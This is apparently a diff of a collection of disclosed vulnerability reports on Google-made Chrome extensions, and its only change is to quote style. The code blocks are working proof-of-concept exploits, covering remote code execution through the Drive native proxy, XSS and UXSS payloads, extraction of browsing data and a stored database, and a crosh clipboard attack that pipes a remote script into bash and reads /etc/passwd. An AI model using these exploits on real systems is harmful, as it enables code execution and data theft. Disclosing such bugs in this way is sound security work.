@@ -47,11 +47,11 @@ Run the following on any google subdomain including insecure `http://` ones.
 The following code runs a VBS script on the victim resulting in RCE.
 
 ```js
-let api = chrome.runtime.connect("lmjegmlicamnimmfhcmpkclmigmmcbeh", {
-  name: "com.google.drive.nativeproxy",
+let api = chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh', {
+  name: 'com.google.drive.nativeproxy',
 });
 let request =
-  "native_opener/v2/3/" +
+  'native_opener/v2/3/' +
   btoa('["<VICTIM EMAIL>", "<SHARED FILE ID>","VkJTRmlsZQ",""]');
 api.postMessage(request);
 ```
@@ -101,9 +101,9 @@ The PoC essentially loads a copy of the Perfetto UI frontend in an iframe, and t
 This is an example of how the page can communicate with the extension:
 
 ```js
-port = chrome.runtime.connect("lfmkphfpdbjijhpomgecfikhfohaoine");
+port = chrome.runtime.connect('lfmkphfpdbjijhpomgecfikhfohaoine');
 port.onMessage.addListener(console.log);
-port.postMessage({ method: "GetCategories" });
+port.postMessage({method: 'GetCategories'});
 ```
 
 [^0-0]: <https://chrome.google.com/webstore/detail/perfetto-ui/lfmkphfpdbjijhpomgecfikhfohaoine>
@@ -127,11 +127,11 @@ It exposes various commands that can be called. The issue is that the message li
 
 ```js
 channel = new MessageChannel();
-win.postMessage("cvox.PortSetup", "*", [channel.port2]);
+win.postMessage('cvox.PortSetup', '*', [channel.port2]);
 channel.port1.postMessage(
   JSON.stringify({
-    cmd: "clickNodeRef",
-    args: [{ cvoxid: '"], ' + selector + ', *[x="' }],
+    cmd: 'clickNodeRef',
+    args: [{cvoxid: '"], ' + selector + ', *[x="'}],
   }),
 );
 ```
@@ -152,7 +152,7 @@ After a few seconds, you should see in <https://myaccount.google.com/permissions
 Apart from this vulnerability, there might be other possible security issues with this extension. For example, as the following code [^5-1] does not sanitize user input; this could potentially lead to UXSS, if it is exploited. (we didn't analyze this yet, but it also looks vulnerable)
 
 ```js
-var html = Msgs.getMsg("pdf_header", [filename, src + "#original"]);
+var html = Msgs.getMsg('pdf_header', [filename, src + '#original']);
 headerDiv.innerHTML = html;
 ```
 
@@ -186,7 +186,7 @@ Downgraded as needs a compromised renderer, maybe CPU bugs work as well :/
 
 ```js
 chrome.runtime.sendMessage(
-  { message: "LoadScript", url: "http://192.168.1.1" },
+  {message: 'LoadScript', url: 'http://192.168.1.1'},
   console.log,
 );
 ```
@@ -199,8 +199,8 @@ However this only worked for the `application/javascript` content type.
 ```js
 chrome.runtime.sendMessage(
   {
-    message: "LoadScript",
-    url: "https://googleads.g.doubleclick.net/pcs/click?adurl=http://localhost:8000/x.js",
+    message: 'LoadScript',
+    url: 'https://googleads.g.doubleclick.net/pcs/click?adurl=http://localhost:8000/x.js',
   },
   console.log,
 );
@@ -218,7 +218,7 @@ Change the JS execution context to the Tag Assistant Legacy's content script, an
 
 ```js
 chrome.runtime.sendMessage(
-  { message: "GetRecordedIssues", tabId: "<TabID>" },
+  {message: 'GetRecordedIssues', tabId: '<TabID>'},
   (a) => {
     console.log(a.statusInfos[0].page.url);
   },
@@ -230,11 +230,11 @@ chrome.runtime.sendMessage(
 Change the JS execution context to the Tag Assistant Legacy's content script, and execute the following:
 
 ```js
-let port = chrome.extension.connect({ name: "popup" });
+let port = chrome.extension.connect({name: 'popup'});
 port.onMessage.addListener((a) => {
   console.log(a.url);
 });
-port.postMessage({ message: "Status", tabId: "<TabID>" });
+port.postMessage({message: 'Status', tabId: '<TabID>'});
 ```
 
 ### Attack scenario
@@ -268,22 +268,22 @@ Impacts:
 
 ```js
 // Allow users to bookmark links that open as a window.
-const openas = params.get("openas");
+const openas = params.get('openas');
 switch (openas) {
-  case "window": {
+  case 'window': {
     // Delete the 'openas' string so we don't get into a loop.  We want to
     // preserve the rest of the query string when opening the window.
-    params.delete("openas");
+    params.delete('openas');
     const url = new URL(document.location.toString());
     url.search = params.toString();
     openNewWindow(url.href).then(() => globalThis.close);
     return;
   }
 
-  case "fullscreen":
-  case "maximized":
+  case 'fullscreen':
+  case 'maximized':
     chrome.windows.getCurrent((win) => {
-      chrome.windows.update(win.id, { state: openas });
+      chrome.windows.update(win.id, {state: openas});
     });
     break;
 }
@@ -320,9 +320,9 @@ Steps to reproduce:
 
 ```js
 onmessage = console.log;
-x = window.open("https://facebook.com");
+x = window.open('https://facebook.com');
 setTimeout(() => {
-  x.postMessage({ message: "iframe message", data: { type: "inspect" } }, "*");
+  x.postMessage({message: 'iframe message', data: {type: 'inspect'}}, '*');
 }, 1000);
 ```
 
@@ -347,7 +347,7 @@ Click the start button via the extensions popup, then go to `https://example.org
 In the context of the content script on an attacker controlled website.
 
 ```js
-chrome.runtime.sendMessage({ messageType: 6 }, (tabInfo) => {
+chrome.runtime.sendMessage({messageType: 6}, (tabInfo) => {
   for (let page in tabInfo.pages) {
     console.log(tabInfo.pages[page].info.url);
   }
@@ -433,11 +433,11 @@ I hope this clarifies the reward decision bit more. And I would like to thank yo
 chrome.storage.sync.set({
   rules: [
     {
-      destination: "alert(window.origin)",
+      destination: 'alert(window.origin)',
       disabled: false,
       isNew: false,
-      operator: "injectJSCode",
-      target: "",
+      operator: 'injectJSCode',
+      target: '',
     },
   ],
 });
@@ -460,9 +460,9 @@ Unverified fix, <https://gerrit-review.googlesource.com/c/gerrit-fe-dev-helper/+
 
 ```js
 window.onclick = () => {
-  open("https://www.google.com");
+  open('https://www.google.com');
   setTimeout(() => {
-    chrome.runtime.sendMessage({ id: "get_apps", tab: { id: "" } }, (e) => {
+    chrome.runtime.sendMessage({id: 'get_apps', tab: {id: ''}}, (e) => {
       console.log(e.html);
     });
   }, 3000);
@@ -500,7 +500,7 @@ This extension requires setup to work: Create DWORD `report_user_browsing_data` 
 In the context of the content script on an attacker controlled site run:
 
 ```js
-chrome.storage.local.get("activeSites", (e) => {
+chrome.storage.local.get('activeSites', (e) => {
   for (let url in JSON.parse(e.activeSites)) console.log(url);
 });
 ```
@@ -620,54 +620,54 @@ poc.html:
     <iframe id="croshFrame"></iframe>
     <script>
       var showFrame = () => {
-        croshFrame.classList.add("show");
+        croshFrame.classList.add('show');
       };
 
-      var shouldShow = window.location.search.indexOf("show") > -1;
+      var shouldShow = window.location.search.indexOf('show') > -1;
 
       if (shouldShow) {
         showFrame();
       }
 
       var setClipboard = async (text) => {
-        const type = "text/plain";
-        const blob = new Blob([text], { type });
-        const data = [new ClipboardItem({ [type]: blob })];
+        const type = 'text/plain';
+        const blob = new Blob([text], {type});
+        const data = [new ClipboardItem({[type]: blob})];
 
         await navigator.clipboard.write(data);
       };
 
       var setupPayload1 = () => {
-        console.info("Setup payload 1");
+        console.info('Setup payload 1');
         var setPayload1 = async () => {
-          console.info("Setting payload 1");
+          console.info('Setting payload 1');
           var clipboardSuccess = false;
           try {
-            var dangerZone = window.location.search.indexOf("danger") > -1;
+            var dangerZone = window.location.search.indexOf('danger') > -1;
             if (dangerZone) {
               // Use payload below if you trust me (does nothing malicious)
               await setClipboard(
-                "shell || curl https://aogarantiza.com/chromium/crosh-payload.txt | bash",
+                'shell || curl https://aogarantiza.com/chromium/crosh-payload.txt | bash',
               );
             } else {
-              await setClipboard("shell || cat /etc/passwd");
+              await setClipboard('shell || cat /etc/passwd');
             }
             clipboardSuccess = true;
           } catch (e) {
-            instructions.innerText = "Please press space or any letter key.";
+            instructions.innerText = 'Please press space or any letter key.';
           }
           if (clipboardSuccess) {
-            window.removeEventListener("keydown", setPayload1);
+            window.removeEventListener('keydown', setPayload1);
             croshFrame.src =
-              "chrome-extension://iodihamcpbpeioajjeobimgagajmlibd/html/nassh.html#crosh";
-            instructions.innerText = "Please wait...";
+              'chrome-extension://iodihamcpbpeioajjeobimgagajmlibd/html/nassh.html#crosh';
+            instructions.innerText = 'Please wait...';
           }
         };
-        window.addEventListener("keydown", setPayload1);
+        window.addEventListener('keydown', setPayload1);
       };
 
       var frameLoadCount = 0;
-      croshFrame.addEventListener("load", () => {
+      croshFrame.addEventListener('load', () => {
         // First load isn't a usable prompt
         frameLoadCount++;
         if (frameLoadCount >= 2) {
@@ -675,10 +675,10 @@ poc.html:
             // Slight delay to allow crosh to initialize and be ready for input
             // Ctrl+J can also be used instead of Enter.
             instructions.innerText =
-              "Please press Ctrl+Shift+V.\nThen press Enter.\n\nThen repeat the steps above.";
+              'Please press Ctrl+Shift+V.\nThen press Enter.\n\nThen repeat the steps above.';
             setTimeout(() => {
               showFrame();
-              croshFrame.classList.add("enablePointerEvents");
+              croshFrame.classList.add('enablePointerEvents');
             }, 8000);
           }, 500);
         }
@@ -816,13 +816,13 @@ In the context of the content script on an attacker controlled website do:
 
 ```js
 // Bypass Self-XSS (For debugging)
-f = document.createElement("iframe");
+f = document.createElement('iframe');
 document.body.appendChild(f);
 chrome = f.contentWindow.chrome;
 
 // Dump database
 chrome.runtime.sendMessage(
-  { type: "EXPORT_REQUEST", payload: { encrypted: false } },
+  {type: 'EXPORT_REQUEST', payload: {encrypted: false}},
   (result) => {
     console.log(atob(result.data));
   },
@@ -899,7 +899,7 @@ The "AffiliCats" website has an open redirect that sets `document.location.href`
 
 ```js
 (f = new URLSearchParams(document.location.search)),
-  (g = new URL(f.get("url")));
+  (g = new URL(f.get('url')));
 ```
 
 ### Attack scenario
@@ -913,18 +913,18 @@ let payload = `
 alert(window.origin);
 `;
 
-let f = document.createElement("iframe");
+let f = document.createElement('iframe');
 f.src =
-  "https://www.gstatic.com/alkali/43ecc24c54630568577e5fdcbc826f3153491684.html";
+  'https://www.gstatic.com/alkali/43ecc24c54630568577e5fdcbc826f3153491684.html';
 document.body.appendChild(f);
 setTimeout(() => {
   f.contentWindow.postMessage(
     {
       resourcePaths: {
-        jsPath: "data:text/html," + encodeURIComponent(payload),
+        jsPath: 'data:text/html,' + encodeURIComponent(payload),
       },
     },
-    "*",
+    '*',
   );
 }, 2000);
 ```
@@ -943,23 +943,23 @@ It's possible to race the postMessage bypassing the `event.source === iframe.con
 This could also be done by abusing the chromium max iframe limit with the null contentWindow trick.
 
 ```js
-f = document.createElement("iframe");
+f = document.createElement('iframe');
 f.hidden = true;
 document.body.appendChild(f);
 
 function tryXSS() {
   loop = setInterval(() => {
     try {
-      f.contentWindow[1].location = "about:blank";
+      f.contentWindow[1].location = 'about:blank';
       f.contentWindow[1].eval(
         "parent.postMessage({duration: 1, height: '</style><img src=x onerror=alert(origin)>', width: 1}, '*')",
       );
       clearInterval(loop);
-      f.contentWindow[1].location = "https://googlechromelabs.github.io";
+      f.contentWindow[1].location = 'https://googlechromelabs.github.io';
     } catch {}
   }, 100);
 
-  f.src = "https://googlechromelabs.github.io/layout-shift-terminator/?autorun";
+  f.src = 'https://googlechromelabs.github.io/layout-shift-terminator/?autorun';
 }
 
 tryXSS();
